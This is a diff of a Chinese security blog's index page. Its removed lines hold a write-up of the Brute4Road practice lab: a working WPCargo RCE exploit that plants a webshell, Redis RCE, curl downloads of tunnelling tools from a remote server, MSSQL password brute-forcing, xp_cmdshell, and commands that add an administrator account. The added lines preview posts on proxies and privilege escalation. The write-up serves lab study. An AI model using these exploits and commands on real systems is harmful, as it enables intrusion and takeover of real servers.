@@ -233,98 +233,9 @@
     <h1 id="flag1"><a href="#flag1" class="headerlink" title="&lt;1&gt; flag1"></a>&lt;1&gt; flag1</h1><h2 id="1-redis主从复制-getshell"><a href="#1-redis主从复制-getshell" class="headerlink" title="(1) redis主从复制 getshell"></a>(1) redis主从复制 getshell</h2><p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921135615282.png" alt="image-20230921135615282"></p>
 <p>fscan扫描发现，6379端口开放 ftp可以匿名登录</p>
 <p>存在 redis 未授权访问</p>
-<p>测试了写计划任务反弹shell，提示没有权限 主从复制rce 得到了shell</p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921140159820.png" alt="image-20230921140159820"></p>
-<p>也可以利用msf的 redis_replication 模块</p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921140452333.png" alt="image-20230921140452333"></p>
-<p>这里 redis连接不稳定，重置了一下靶场 </p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921141930827.png" alt="image-20230921141930827"></p>
-<h2 id="2-suid-base64读文件"><a href="#2-suid-base64读文件" class="headerlink" title="(2) suid - base64读文件"></a>(2) suid - base64读文件</h2><p>拿到shell后  在 &#x2F;home&#x2F;redis&#x2F;flag&#x2F;  下发现flag文件 flag01 </p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921142140402.png" alt="image-20230921142140402"></p>
-<p>用户为redis，没有权限读取，需要提权</p>
-<p>查找具有suid权限的可执行程序</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure>
-
-<p>发现了 &#x2F;usr&#x2F;bin&#x2F;base64</p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921142243739.png" alt="image-20230921142243739"></p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230920203631696.png" alt="image-20230920203631696"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> <span class="string">&quot;/home/redis/flag/flag01&quot;</span> | <span class="built_in">base64</span> --decode</span><br></pre></td></tr></table></figure>
-
-<p>得到flag1：</p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921142309023.png" alt="image-20230921142309023"></p>
-<h1 id="flag2"><a href="#flag2" class="headerlink" title="&lt;2&gt; flag2"></a>&lt;2&gt; flag2</h1><h2 id="1-内网信息收集"><a href="#1-内网信息收集" class="headerlink" title="(1) 内网信息收集"></a>(1) 内网信息收集</h2><p>ifconfig、ip addr、arp -a  或 cat &#x2F;etc&#x2F;hosts获取得到所在内网网段 172.22.2.7&#x2F;24</p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921142552112.png" alt="image-20230921142552112"></p>
-<p>上传一个fscan 扫一下c段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.2.3      is alive</span><br><span class="line">(icmp) Target 172.22.2.7      is alive</span><br><span class="line">(icmp) Target 172.22.2.16     is alive</span><br><span class="line">(icmp) Target 172.22.2.18     is alive</span><br><span class="line">(icmp) Target 172.22.2.34     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 5</span><br><span class="line">172.22.2.3:445 open</span><br><span class="line">172.22.2.7:21 open</span><br><span class="line">172.22.2.7:22 open</span><br><span class="line">172.22.2.7:6379 open</span><br><span class="line">172.22.2.16:1433 open</span><br><span class="line">172.22.2.34:445 open</span><br><span class="line">172.22.2.16:445 open</span><br><span class="line">172.22.2.18:445 open</span><br><span class="line">172.22.2.34:139 open</span><br><span class="line">172.22.2.18:139 open</span><br><span class="line">172.22.2.16:139 open</span><br><span class="line">172.22.2.34:135 open</span><br><span class="line">172.22.2.3:139 open</span><br><span class="line">172.22.2.16:135 open</span><br><span class="line">172.22.2.3:135 open</span><br><span class="line">172.22.2.18:80 open</span><br><span class="line">172.22.2.16:80 open</span><br><span class="line">172.22.2.18:22 open</span><br><span class="line">172.22.2.7:80 open</span><br><span class="line">172.22.2.3:88 open</span><br><span class="line">[*] alive ports len is: 20</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.2.3</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]172.22.2.3</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.2.34</span><br><span class="line">   [-&gt;]CLIENT01</span><br><span class="line">   [-&gt;]172.22.2.34</span><br><span class="line">[*] WebTitle: http://172.22.2.16        code:404 len:315    title:Not Found</span><br><span class="line">[*] 172.22.2.3  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios: 172.22.2.34     XIAORANG\CLIENT01              </span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.2.16</span><br><span class="line">   [-&gt;]MSSQLSERVER</span><br><span class="line">   [-&gt;]172.22.2.16</span><br><span class="line">[*] NetBios: 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] NetBios: 172.22.2.3      [+]DC DC.xiaorang.lab               Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS</span><br><span class="line">[*] 172.22.2.16  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios: 172.22.2.18     WORKGROUP\UBUNTU-WEB02         </span><br><span class="line">[+] ftp://172.22.2.7:21:anonymous </span><br><span class="line">   [-&gt;]pub</span><br><span class="line">[*] WebTitle: http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点</span><br></pre></td></tr></table></figure>
-
-<p>扫出来了存活的四台主机</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">       172.22.2.3        DC</span><br><span class="line">Target 172.22.2.7        Web站点</span><br><span class="line">Target 172.22.2.16     Windows Server  MSSQLSERVER</span><br><span class="line">Target 172.22.2.18      WordPress站点</span><br><span class="line">Target 172.22.2.34     </span><br></pre></td></tr></table></figure>
-
-<p>上传frp 或者 vennom 搞一个socks代理  我习惯用venom   </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://vps:port/frpc --output frpc</span><br><span class="line">curl http://101.42.224.57:2222/agent_linux_x64 --output agent</span><br><span class="line">curl http://101.42.224.57:2222/fscan_amd64 --output fscan</span><br><span class="line">curl http://vps:port/frpc.ini --output frpc.ini</span><br></pre></td></tr></table></figure>
-
-<p>注：<strong>socks只能代理tcp的流量，ping走的是icmp，所以我们挂上socks代理也是ping不了的。</strong></p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921143305002.png" alt="image-20230921143305002"></p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921145259096.png" alt="image-20230921145259096"></p>
-<p>linux 里配置proxychains 代理</p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921144929532.png" alt="image-20230921144929532"></p>
-<h2 id="2-wordpress-WPCargo-6-9-0rce-getshell"><a href="#2-wordpress-WPCargo-6-9-0rce-getshell" class="headerlink" title="(2) wordpress  WPCargo &lt; 6.9.0rce getshell"></a>(2) wordpress  WPCargo &lt; 6.9.0rce getshell</h2><p>之后 wpscan扫一下 wordpress站点</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 wpscan --url  http://172.22.2.18/</span><br></pre></td></tr></table></figure>
-
-<p>存在 wpcargo插件  version: 6.x.x</p>
-<p> WPCargo &lt; 6.9.0存在一个RCE漏洞</p>
-<p>网上搜索 WPCargo &lt; 6.9.0 - Unauthenticated RCE 查到：</p>
-<p><a target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a">https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a</a></p>
-<p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is a magic string that when treated as pixels and compressed using the png</span></span><br><span class="line"><span class="comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span></span><br><span class="line">payload = <span class="string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_character_code</span>(<span class="params">c: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(c).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span>.join([encode_character_code(c) <span class="keyword">for</span> c <span class="keyword">in</span> binascii.unhexlify(payload)])[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">destination_url = <span class="string">&#x27;http://127.0.0.1:8001/&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span></span><br><span class="line">requests.get(</span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;destination_url&#125;</span>wp-content/plugins/wpcargo/includes/barcode.php?text=<span class="subst">&#123;text&#125;</span>&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span></span><br><span class="line"><span class="built_in">print</span>(requests.post(</span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;destination_url&#125;</span>webshell.php?1=system&quot;</span>, data=&#123;<span class="string">&quot;2&quot;</span>: cmd&#125;</span><br><span class="line">).content.decode(<span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-<p>挂上代理使用python运行 不知道为啥报错了 </p>
-<p>后来把exp.py上传到外网机运行才成功</p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921150205932.png" alt="image-20230921150205932"></p>
-<p>成功写入shell</p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921150244127.png" alt="image-20230921150244127"></p>
-<p>因为写入的木马是system，所以调换蚁剑连接模式    蚁剑连接</p>
-<p>我的蚁剑好像没有这个模式 <del>，，，，，，，  那就直接执行命令吧 都一样  只不过蚁剑那样查看文件更清晰明了一点</del></p>
-<p>下载了新版蚁剑  连接上去之后 在 wp-config.php 查看 wordpress的配置文件信息</p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921153948482.png" alt="image-20230921153948482"></p>
-<p>得到了数据库的用户名和连接密码    wpuser:WpuserEha8Fgj9</p>
-<p>右键数据操作 连接上去看看</p>
-<p>得到 flag02</p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921154138184.png" alt="image-20230921154138184"></p>
-<h1 id="flag3"><a href="#flag3" class="headerlink" title="&lt;3&gt; flag3"></a>&lt;3&gt; flag3</h1><h2 id="1-MSSqlServer-RCE"><a href="#1-MSSqlServer-RCE" class="headerlink" title="(1) MSSqlServer RCE"></a>(1) MSSqlServer RCE</h2><p>再查看提示 S0meth1ng_y0u_m1ght_1ntereSted   读取</p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921154318261.png" alt="image-20230921154318261"></p>
-<p>得到了一些个密码   结合签名 fscan扫出来的内网机子</p>
-<p>可能存在 172.22.2.16 这台MSSQLSERVER 的密码</p>
-<p>[*]172.22.2.16<br>   [-&gt;]MSSQLSERVER<br>   [-&gt;]172.22.2.16</p>
-<p>将密码全部导出  爆破一下 MSSql密码  这里利用hydra工具</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 hydra -l sa -P pass.txt 172.22.2.16 mssql</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921155542302.png" alt="image-20230921155542302"></p>
-<p>得到密码 ElGNkOiC</p>
-<p>可以使用navicat + proxyxifier</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 开启xp_cmdshell</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;</span><br></pre></td></tr></table></figure>
-
-<p>这里直接使用Multiple.Database.Utilization.Tools工具连接</p>
-<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT</a></p>
-<p>前面fscan 扫描 也得到了这台机子版本  Windows Server 2016 Datacenter 14393</p>
-<p>执行 netstat -ano 开启了3389端口</p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921160039316.png" alt="image-20230921160039316"></p>
-<h2 id="2-Ladon-BadPotato提权-rdp远程登录"><a href="#2-Ladon-BadPotato提权-rdp远程登录" class="headerlink" title="(2) Ladon BadPotato提权&amp;rdp远程登录"></a>(2) Ladon BadPotato提权&amp;rdp远程登录</h2><p>Windows Server 2016  可以用SweetPotato提权 </p>
-<p>项目介绍：从Windows 7到Windows 10 &#x2F; Server 2019的本地服务到系统权限提升漏洞，也是土豆家族的有一个提权漏洞</p>
-<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a></p>
-<p>上传SweetPotato.exe提权，得到system权限</p>
-<p>不确定的话 也可以上传 Ladon上去</p>
-<p>激活Ole Automation Procedures组件，把Ladon上传上去</p>
-<p>测试，BadPotato成功提权</p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921164757205.png" alt="image-20230921164757205"></p>
-<p>添加管理员用户</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/迅雷下载/Ladon911.exe BadPotato &quot;net user test 123qwe! /add&quot;</span><br><span class="line">C:/迅雷下载/Ladon911.exe BadPotato &quot;net localgroup administrators test /add&quot;</span><br></pre></td></tr></table></figure>
-
-<p>创建成功后  rdp 远程登录</p>
-<p>在 Administrator 目录下得到flag03</p>
-<p><img src="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/image-20230921165648726.png" alt="image-20230921165648726"></p>
-<h1 id="flag4"><a href="#flag4" class="headerlink" title="&lt;4&gt; flag4"></a>&lt;4&gt; flag4</h1><p>涉及到一些 约束委派、票据方面的 用到的Redbus工具 还没学到 学了之后再记录一下</p>
-
+    
+    <a class="article-more-a" href="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/#more">more >></a>
+    
     
 
     
@@ -848,6 +759,424 @@
 
 
   
+    <article id="post-Venom内网代理工具" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2023/09/01/Venom%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/" target="_blank">Venom内网代理工具</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2023/09/01/Venom%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/" class="archive-article-date">
+        <time datetime="2023-09-01T09:41:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-09-01</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>摘要：Venom代理工具使用</p>
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="&lt;1&gt; 工具介绍"></a>&lt;1&gt; 工具介绍</h2><p>Venom是一款为渗透测试人员设计的、使用Go开发的多级代理工具</p>
+<p>Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理</p>
+<p>在内网渗透时，可将网络流量代理到多层内网</p>
+    
+    <a class="article-more-a" href="/2023/09/01/Venom%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2023/09/01/Venom%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Thinkphp-v6-0-13反序列化-CVE-2022-38352-分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2023/08/26/Thinkphp-v6-0-13%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2022-38352-%E5%88%86%E6%9E%90/" target="_blank">Thinkphp v6.0.13反序列化(CVE-2022-38352)分析</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2023/08/26/Thinkphp-v6-0-13%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2022-38352-%E5%88%86%E6%9E%90/" class="archive-article-date">
+        <time datetime="2023-08-26T13:42:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-08-26</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="Thinkphp-v6-0-13反序列化rce漏洞-CVE-2022-38352-分析"><a href="#Thinkphp-v6-0-13反序列化rce漏洞-CVE-2022-38352-分析" class="headerlink" title="Thinkphp v6.0.13反序列化rce漏洞(CVE-2022-38352)分析"></a>Thinkphp v6.0.13反序列化rce漏洞(CVE-2022-38352)分析</h1><p>摘要：ThinkPHP 6.0.13 反序列化rce漏洞分析</p>
+    
+    <a class="article-more-a" href="/2023/08/26/Thinkphp-v6-0-13%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2022-38352-%E5%88%86%E6%9E%90/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2023/08/26/Thinkphp-v6-0-13%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2022-38352-%E5%88%86%E6%9E%90/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Linux-环境变量提权" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2023/08/19/Linux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/" target="_blank">Linux-环境变量提权</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2023/08/19/Linux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/" class="archive-article-date">
+        <time datetime="2023-08-19T13:28:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-08-19</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="环境变量介绍"><a href="#环境变量介绍" class="headerlink" title="&lt;1&gt; 环境变量介绍"></a>&lt;1&gt; 环境变量介绍</h2><p>$PATH是Linux和类Unix操作系统中的环境变量，它指定了存储所有可执行程序的 bin 和 sbin 目录。当用户在终端运行任何命令时，它向shell发出请求，在环境变量的帮助下搜索可执行文件以响应用户执行的命令。超级用户root 通常还具有&#x2F;sbin和&#x2F;usr &#x2F;sbin条目，以便轻松执行系统管理命令。</p>
+<p>使用echo命令就能查看和当前用户相关的环境变量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境变量提权原理"><a href="#环境变量提权原理" class="headerlink" title="&lt;2&gt;  环境变量提权原理"></a>&lt;2&gt;  环境变量提权原理</h2><p>其原理就是利用suid的权限调用所属主用户即root用户执行c里的代码</p>
+<p>$PATH主要用于定义可执行程序的搜索目录。可执行程序包括 Linux系统命令和用户的应用程序</p>
+<p>例如：当某个程序 调用 system(“cat &#x2F;flag”) 时 它并不是以 system(“&#x2F;bin&#x2F;cat &#x2F;flag”);这样来调用cat的 可以被利用</p>
+<p>系统会按照$PATH环境变量中定义的顺序，从左到右搜索cat 如果$PATH &#x3D; &#x2F;tmp:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin  则会优先搜索 &#x2F;tmp目录是否存在cat</p>
+<p>$PATH环境变量劫持的原理：即自己构造一个同名的恶意程序，将要恶意程序所在的路径添加到PATH环境变量的前面，使其被优先加载。 而如果我们劫持的这个程序，是一个本身就具有SUID权限，以root身份执行的程序，那么 劫持成功的话，就是root执行我们的恶意程序，写入 &#x2F;bin&#x2F;bash即可提权</p>
+<h2 id="ubuntu环境配置"><a href="#ubuntu环境配置" class="headerlink" title="&lt;3&gt; ubuntu环境配置"></a>&lt;3&gt; ubuntu环境配置</h2><p>现在我们的当前目录是&#x2F;home&#x2F;lvxyz，我们将在当前目录下创建一个srcipt目录。然后cd到script目录中，编写一个简单的c程序来调用系统二进制文件的函数</p>
+<p><img src="/2023/08/19/Linux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/3074366-20230827011112228-331020279.png"></p>
+<p><img src="/2023/08/19/Linux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/3074366-20230827011123131-1018005304.png"></p>
+<p>代码 通过 setuid() 和 setgid() 更改uid、gid为0 即 root </p>
+<p>然后调用system()函数 执行 ps命令 即系统二进制文件&#x2F;bin&#x2F;ps</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@lvxyz-ubuntu:~/script$ whereis ps</span><br><span class="line">ps: /bin/ps /usr/share/man/man1/ps.1.gz</span><br></pre></td></tr></table></figure>
+
+<p>我们使用gcc命令编译demo.c文件并且赋予编译文件SUID权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc demo.c -o demo</span><br><span class="line">chmod u+s demo</span><br><span class="line">ls -la demo</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/19/Linux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/3074366-20230827011137712-1806550246.png"></p>
+<h2 id="Attack利用"><a href="#Attack利用" class="headerlink" title="&lt;4&gt; Attack利用"></a>&lt;4&gt; Attack利用</h2><p>假设我们的ubuntu 是我们已经入侵成功的主机，ssh成功登录lvxyz普通用户了，现在要进行提权</p>
